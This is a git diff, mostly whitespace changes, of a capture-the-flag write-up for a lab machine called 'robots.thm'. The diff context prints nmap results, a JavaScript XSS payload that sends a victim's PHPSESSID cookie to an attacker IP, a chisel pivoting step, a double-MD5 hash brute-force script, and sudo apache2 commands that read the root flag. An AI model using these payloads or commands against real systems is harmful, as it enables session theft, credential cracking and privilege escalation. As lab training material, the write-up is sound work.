@@ -9,24 +9,24 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | ssh     |
-| 80   | http    |
-| 9000 | http    |
+| 22 | ssh |
+| 80 | http |
+| 9000 | http |
 
 ```
-PORT     STATE SERVICE REASON  VERSION
-22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 (protocol 2.0)
-80/tcp   open  http    syn-ack Apache httpd 2.4.61
+PORT STATE SERVICE REASON VERSION
+22/tcp open ssh syn-ack OpenSSH 8.9p1 (protocol 2.0)
+80/tcp open http syn-ack Apache httpd 2.4.61
 | http-methods:
-|_  Supported Methods: GET POST OPTIONS HEAD
+|_ Supported Methods: GET POST OPTIONS HEAD
 |_http-title: 403 Forbidden
 |_http-server-header: Apache/2.4.61 (Debian)
 | http-robots.txt: 3 disallowed entries
 |_/harming/humans /ignoring/human/orders /harm/to/self
-9000/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
+9000/tcp open http syn-ack Apache httpd 2.4.52 ((Ubuntu))
 |_http-title: Apache2 Ubuntu Default Page: It works
 | http-methods:
-|_  Supported Methods: POST OPTIONS HEAD GET
+|_ Supported Methods: POST OPTIONS HEAD GET
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 Service Info: Host: robots.thm
 ```
@@ -115,12 +115,12 @@ var attacker = "http://10.6.34.159/exfil";
 var xhr = new XMLHttpRequest();
 
 xhr.onreadystatechange = function() {
-    if (xhr.readyState == XMLHttpRequest.DONE) {
-        var match = xhr.responseText.match(/PHPSESSID=([a-zA-Z0-9]+)/);
-        if (match) {
-            fetch(attacker + "?cookie=" + match[1]);
-        }
-    }
+ if (xhr.readyState == XMLHttpRequest.DONE) {
+ var match = xhr.responseText.match(/PHPSESSID=([a-zA-Z0-9]+)/);
+ if (match) {
+ fetch(attacker + "?cookie=" + match[1]);
+ }
+ }
 }
 
 xhr.open('GET', url, true);
@@ -237,7 +237,7 @@ Now, we need to download the chisel binary on our target machine and do this, `w
 
 ```
 www-data@robots:/tmp$ getent hosts db
-172.18.0.3      db
+172.18.0.3 db
 ```
 
 ```
@@ -277,40 +277,40 @@ import hashlib
 import sys
 
 def find_matching_double_md5(username, target_hash):
-    if not username:
-        print("Username must be provided")
-        return
-    
-    for day in range(1, 32):
-        for month in range(1, 13):
-            # Format day and month to ddmm
-            ddmm = f"{day:02d}{month:02d}"
-            # Concatenate username with ddmm
-            combined_string = username + ddmm
-            
-            # First MD5 hash
-            first_md5 = hashlib.md5(combined_string.encode()).hexdigest()
-            
-            # Second MD5 hash
-            double_md5 = hashlib.md5(first_md5.encode()).hexdigest()
-            
-            if double_md5 == target_hash:
-                print(f"\nMatch found:")
-                print(f"Combined string: {combined_string}")
-                print(f"First MD5: {first_md5}")
-                print(f"Double MD5: {double_md5}")
-                return
+ if not username:
+ print("Username must be provided")
+ return
+ 
+ for day in range(1, 32):
+ for month in range(1, 13):
+ # Format day and month to ddmm
+ ddmm = f"{day:02d}{month:02d}"
+ # Concatenate username with ddmm
+ combined_string = username + ddmm
+ 
+ # First MD5 hash
+ first_md5 = hashlib.md5(combined_string.encode()).hexdigest()
+ 
+ # Second MD5 hash
+ double_md5 = hashlib.md5(first_md5.encode()).hexdigest()
+ 
+ if double_md5 == target_hash:
+ print(f"\nMatch found:")
+ print(f"Combined string: {combined_string}")
+ print(f"First MD5: {first_md5}")
+ print(f"Double MD5: {double_md5}")
+ return
 
-    print("No match found")
+ print("No match found")
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python script.py <username> <target_hash>")
-        sys.exit(1)
+ if len(sys.argv) != 3:
+ print("Usage: python script.py <username> <target_hash>")
+ sys.exit(1)
 
-    username = sys.argv[1]
-    target_hash = sys.argv[2]
-    find_matching_double_md5(username, target_hash)
+ username = sys.argv[1]
+ target_hash = sys.argv[2]
+ find_matching_double_md5(username, target_hash)
 ```
 
 We need to use it in the format of `username`, `target_hash`:
@@ -382,7 +382,7 @@ Let's search this on GTFOBINS:
 We can read the root flag with this:
 
 ```
-sudo /usr/sbin/apache2 -c "Include /root/root.txt" -k stop   
+sudo /usr/sbin/apache2 -c "Include /root/root.txt" -k stop 
 
 sudo -u root /usr/sbin/apache2 -C "DEFINE APACHE_RUN_DIR /tmp" -C "Include /root/root.txt" -k stop
 ```
